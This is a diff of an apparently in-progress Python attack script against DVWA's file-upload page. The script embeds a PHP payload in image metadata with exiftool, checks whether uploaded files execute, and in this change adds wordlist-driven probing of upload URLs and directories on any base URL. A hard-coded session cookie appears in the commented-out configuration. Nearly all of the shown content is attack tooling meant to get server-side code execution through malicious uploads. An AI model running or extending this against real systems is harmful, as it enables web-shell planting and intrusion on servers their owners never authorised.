@@ -1,3 +1,5 @@
+#testing uploadv2.py and mainv2.py, still under testing
+
 #!/usr/bin/env python3
 import requests
 import os
@@ -6,16 +8,15 @@ import time
 import urllib.parse
 
 # Configuration for DVWA
-BASE_URL = "http://localhost/DVWA/"
-UPLOAD_URL = f"{BASE_URL}vulnerabilities/upload/"
-UPLOAD_DIR = f"{BASE_URL}hackable/uploads/"
-LOCAL_UPLOAD_PATH = "/var/www/html/DVWA/hackable/uploads/"
-COOKIE = {
-    'PHPSESSID': 'jtilroio40ftke9gn0qvqj17m1',
-    'security': 'medium'
-}
+# BASE_URL = "http://localhost/DVWA/"
+# UPLOAD_URL = f"{BASE_URL}vulnerabilities/upload/" testing wordlist
+# UPLOAD_DIR = f"{BASE_URL}hackable/uploads/" testing wordlist
+# LOCAL_UPLOAD_PATH = "/var/www/html/DVWA/hackable/uploads/" testing wordlist
+# COOKIE = {
+#     'PHPSESSID': 'jtilroio40ftke9gn0qvqj17m1',
+#     'security': 'medium'
+# }
 REPORT_FILENAME = "vuln_report.txt"
-
 
 def embed_php_in_image(image_file, output_file):
     """Embed PHP payload inside an image metadata using exiftool."""
@@ -124,3 +125,29 @@ def test_uploaded_files(uploaded_files):
             print(f"[-] Error testing {filename}: {str(e)}")
 
     return successful_executions
+
+def try_upload_url(base_url, wordlist_file, cookie, payload_filename):
+    """
+    Try candidate upload URL paths from a wordlist until one succeeds.
+    Lines starting with '#' are ignored.
+    """
+    with open(wordlist_file, "r") as f:
+        candidate_paths = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
+    for path in candidate_paths:
+        upload_url = base_url + path
+        print(f"[*] Trying upload URL: {upload_url}")
+        if upload_file(upload_url, payload_filename, cookie):
+            print(f"[+] Upload succeeded with URL: {upload_url}")
+            return upload_url
+    return None
+
+def get_upload_directory(base_url, wordlist_file):
+    """
+    Read candidate upload directories from a wordlist and return the first one.
+    Lines starting with '#' are ignored.
+    """
+    with open(wordlist_file, "r") as f:
+        candidate_dirs = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
+    for d in candidate_dirs:
+        print(f"[*] Candidate upload directory: {base_url + d}")
+    return base_url + candidate_dirs[0]
